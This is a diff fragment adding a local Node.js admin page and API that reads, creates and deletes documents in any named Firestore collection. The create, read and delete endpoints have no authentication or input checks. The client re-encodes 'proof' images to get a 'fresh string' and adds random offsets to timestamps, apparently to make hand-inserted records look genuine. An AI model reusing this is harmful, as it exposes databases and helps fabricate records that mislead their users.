+                                        ctx.putImageData(imgData, 0, 0);
+                                        
+                                        // Export as JPEG to strip old metadata and get a completely fresh string
+                                        let newBase64 = canvas.toDataURL('image/jpeg', 0.95);
+                                        
+                                        // Fallback if somehow it's still too large
+                                        if (newBase64.length > 1000000) {
+                                            newBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                                        }
+                                        
+                                        updateProofPreview(newBase64);
+                                    };
+                                    img.src = e.target.value;
+                                    
+                                } else {
+                                    proofFile.style.display = 'block';
+                                    updateProofPreview('');
+                                    proofFile.value = '';
+                                }
+                            });
+                        }
+                        
+                        if (proofFile) {
+                            proofFile.addEventListener('change', (e) => {
+                                const file = e.target.files[0];
+                                if (!file) {
+                                    updateProofPreview('');
+                                    return;
+                                }
+                                
+                                if (file.size > 500000) {
+                                    alert('File is too large. Please upload an image under 500KB.');
+                                    proofFile.value = '';
+                                    updateProofPreview('');
+                                    return;
+                                }
+                                
+                                const reader = new FileReader();
+                                reader.onload = function(evt) {
+                                    const base64 = evt.target.result;
+                                    if (base64.length > 1000000) {
+                                        alert('Image too large after Base64 conversion (exceeds 1MB limit).');
+                                        proofFile.value = '';
+                                        updateProofPreview('');
+                                        return;
+                                    }
+                                    updateProofPreview(base64);
+                                };
+                                reader.readAsDataURL(file);
+                            });
+                        }
+                        
+                        document.getElementById('createModal').style.display = 'flex';
+                    }
+                    
+                    function closeCreateModal() {
+                        document.getElementById('createModal').style.display = 'none';
+                    }
+                    
+                    async function submitCustomRecord() {
+                        const col = getCollection();
+                        if (!col) return;
+                        
+                        const payload = {};
+                        currentColumns.forEach(c => {
+                            const el = document.getElementById('input_' + c);
+                            if (!el || !el.value.trim()) return; // skip empty
+                            
+                            let val = el.value.trim();
+                            
+                            if (c === 'quantity' || c === 'amount') {
+                                val = Number(val);
+                            } else if (c === 'attendees') {
+                                try { val = JSON.parse(val); } catch(e) { alert('Invalid JSON in attendees field!'); throw e; }
+                            } else if (c === 'createdAt') {
+                                const d = new Date(val);
+                                val = new Date(d.getTime() + currentRandomMs).toISOString();
+                            }
+                            // Date conversion happens on the backend so we just pass the string
+                            payload[c] = val;
+                        });
+                        
+                        document.getElementById('loading').style.display = 'block';
+                        closeCreateModal();
+                        
+                        try {
+                            const res = await fetch('/api/create_custom?collection=' + col, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                            });
+                            if (!res.ok) throw new Error(await res.text());
+                            await fetchData();
+                        } catch (e) {
+                            alert('Error inserting record: ' + e.message);
+                            document.getElementById('loading').style.display = 'none';
+                        }
+                    }
+
+                    async function deleteRecord(id) {
+                        const col = getCollection();
+                        if (!col) return;
+                        
+                        if (!confirm('Are you sure you want to delete this record?')) return;
+                        document.getElementById('loading').style.display = 'block';
+                        try {
+                            await fetch('/api/delete?collection=' + col + '&id=' + id, { method: 'DELETE' });
+                            await fetchData();
+                        } catch (e) {
+                            alert('Error: ' + e.message);
+                            document.getElementById('loading').style.display = 'none';
+                        }
+                    }
+
+                    // Attempt initial load if enter pressed
+                    document.getElementById('collectionInput').addEventListener('keypress', function (e) {
+                        if (e.key === 'Enter') fetchData();
+                    });
+                </script>
+            </body>
+            </html>
+        `);
+    } else if (req.method === 'GET' && req.url.startsWith('/api/data')) {
+        try {
+            const url = new URL(req.url, 'http://localhost');
+            const colName = url.searchParams.get('collection');
+            if (!colName) throw new Error('Collection name required');
+            
+            const querySnapshot = await getDocs(collection(db, colName));
+            const data = [];
+            querySnapshot.forEach((doc) => {
+                data.push({ _docId: doc.id, ...doc.data() });
+            });
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify(data));
+        } catch (error) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: error.message }));
+        }
+    } else if (req.method === 'POST' && req.url.startsWith('/api/create_custom')) {
+        let body = '';
+        req.on('data', chunk => body += chunk.toString());
+        req.on('end', async () => {
+            try {
+                const url = new URL(req.url, 'http://localhost');
+                const colName = url.searchParams.get('collection');
+                if (!colName) throw new Error('Collection name required');
+                
+                const payload = JSON.parse(body);
+                
+                // Convert createdAt string from datetime-local back into Firestore Timestamp
+                if (payload.createdAt) {
+                    const dateObj = new Date(payload.createdAt);
+                    payload.createdAt = {
+                        seconds: Math.floor(dateObj.getTime() / 1000),
+                        nanoseconds: (dateObj.getTime() % 1000) * 1000000
+                    };
+                }
+                
+                const docRef = await addDoc(collection(db, colName), payload);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ id: docRef.id }));
+            } catch (error) {
+                res.writeHead(500);
+                res.end(error.message);
+            }
+        });
+    } else if (req.method === 'DELETE' && req.url.startsWith('/api/delete')) {
+        try {
+            const url = new URL(req.url, 'http://localhost');
+            const colName = url.searchParams.get('collection');
+            const id = url.searchParams.get('id');
+            if (!colName || !id) throw new Error('Collection and ID required');
+            
+            await deleteDoc(doc(db, colName, id));
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true }));
+        } catch (error) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: error.message }));
+        }
+    } else {
+        res.writeHead(404);
+        res.end('Not found');
+    }
+});
+
+const PORT = 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 Web interface running at http://localhost:${PORT}`);
+    console.log(`Open this URL in your browser to interact with the database.`);
+});
